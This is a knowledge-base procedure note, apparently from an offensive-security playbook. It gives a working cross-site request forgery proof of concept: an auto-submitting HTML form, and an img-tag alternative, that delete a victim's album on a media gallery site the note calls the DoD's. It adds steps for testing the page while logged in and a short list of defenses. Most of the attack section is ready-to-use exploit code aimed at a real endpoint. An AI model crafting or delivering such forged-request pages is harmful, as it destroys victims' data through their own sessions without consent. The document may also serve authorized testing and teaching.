---
id: d4e5f6g7-h8i9-0123-defg-456789012345
tags:
  - poc
  - csrf
  - html
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:42.773Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-CSRF-Proof-of-Concept

## Summary

This procedure creates a simple HTML-based PoC to forge a GET request to the vulnerable delete endpoint, exploiting the CSRF flaw in the DoD media gallery.

## Description

The PoC leverages the intercepted GET request by embedding it in an HTML page that auto-submits via a form or img tag when loaded in the victim's browser. This uses the victim's active session cookies to authenticate the deletion. Target environment is any browser; prerequisites include the victim's album ID. Expected outcome: A hosted or local HTML file that triggers deletion on load.

## Requirements

1. Knowledge of vulnerable endpoint and album ID
2. Text editor for HTML creation
3. Hosting for delivery (optional)

## Defense

Defensive measures and detection strategies:

- Validate CSRF tokens on all state-changing requests
- Use SameSite cookies to mitigate CSRF
- Scan for suspicious HTML in emails/links

## Objectives

1. Forge the delete request in HTML
2. Ensure auto-execution without user interaction
3. Test PoC in controlled environment

## Instructions

### Step 1: Write HTML PoC

**Context**: Create the forging mechanism.

Use a form with auto-submit:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://www.[redacted]/mediagallery/delete/id/{victim_album_id}" method="GET">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

> Replace {victim_album_id} with actual ID. Alternatively, use <img src="https://www.[redacted]/mediagallery/delete/id/{victim_album_id}"> for img-based forgery.

### Step 2: Test PoC

**Context**: Verify in authenticated browser.

Load the HTML file while logged in; check if album deletes.

> Success if album is removed without direct UI interaction.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[poc]]
- [[html]]
